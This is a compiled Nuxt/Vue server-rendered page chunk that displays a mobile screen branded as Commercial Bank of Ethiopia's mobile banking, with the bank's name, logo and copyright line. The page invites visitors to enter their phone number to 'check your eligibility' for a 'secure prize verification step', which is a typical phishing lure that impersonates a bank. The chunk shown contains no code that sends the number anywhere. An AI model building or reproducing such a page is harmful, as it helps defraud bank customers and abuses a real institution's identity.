globalThis.__timing__.logStart('Load chunks/build/index-BRDfK_ul');import { defineComponent, ref, mergeProps, unref, useSSRContext } from 'vue';
import { ssrRenderAttrs, ssrRenderAttr, ssrIncludeBooleanAttr, ssrInterpolate } from 'vue/server-renderer';
import { _ as _imports_0 } from './virtual_public-GXG8ACDz.mjs';
import '../routes/renderer.mjs';
import 'vue-bundle-renderer/runtime';
import '../nitro/nitro.mjs';
import 'node:http';
import 'node:https';
import 'node:events';
import 'node:buffer';
import 'node:fs';
import 'node:path';
import 'node:crypto';
import 'unhead/server';
import 'devalue';
import 'unhead/utils';

const _sfc_main = /* @__PURE__ */ defineComponent({
  __name: "index",
  __ssrInlineRender: true,
  setup(__props) {
    const phone = ref("");
    const statusMessage = ref("");
    const isSubmitting = ref(false);
    return (_ctx, _push, _parent, _attrs) => {
      _push(`<main${ssrRenderAttrs(mergeProps({ class: "mobile-screen" }, _attrs))}><header class="topbar"><div><p class="app-title">CBE Mobile Banking</p><p class="app-subtitle">Secure mobile banking experience</p></div><div class="topbar-actions" aria-label="Quick actions"><button class="icon-button" type="button" aria-label="Notifications"><span class="bell-icon"></span></button><button class="lang-pill" type="button" aria-label="Current language"> EN </button></div></header><section class="hero-card"><div class="logo-wrap" aria-label="Commercial Bank of Ethiopia logo"><img class="logo-image"${ssrRenderAttr("src", _imports_0)} alt="Commercial Bank of Ethiopia logo"></div><div class="hero-copy"><h1>Welcome!</h1><p class="brand-name">Commercial Bank of Ethiopia</p><p class="greeting">Good Afternoon</p></div><p class="helper-text"> Confirm your phone number to check your eligibility and continue to the secure prize verification step. </p><label class="input-block" for="phone"><span class="sr-only">Phone number</span><input id="phone"${ssrRenderAttr("value", unref(phone))} type="tel" inputmode="tel" placeholder="Phone Number"></label><button class="continue-button" type="button" aria-label="Continue"${ssrIncludeBooleanAttr(unref(isSubmitting)) ? " disabled" : ""}><span class="arrow-icon"></span></button>`);
      if (unref(statusMessage)) {
        _push(`<p class="status-text">${ssrInterpolate(unref(statusMessage))}</p>`);
      } else {
        _push(`<!---->`);
      }
      _push(`</section><footer class="bottom-panel"><div class="chat-row"><span>Do you have any question?</span><button class="chat-pill" type="button">Chatbot</button></div><button class="service-button" type="button"><span class="service-icon">◌</span><span>Non-Financial Services</span></button><p class="copyright">Copyright © Commercial Bank Of Ethiopia</p></footer></main>`);
    };
  }
});
const _sfc_setup = _sfc_main.setup;
_sfc_main.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("pages/index.vue");
  return _sfc_setup ? _sfc_setup(props, ctx) : void 0;
};

export { _sfc_main as default };;globalThis.__timing__.logEnd('Load chunks/build/index-BRDfK_ul');
//# sourceMappingURL=index-BRDfK_ul.mjs.map
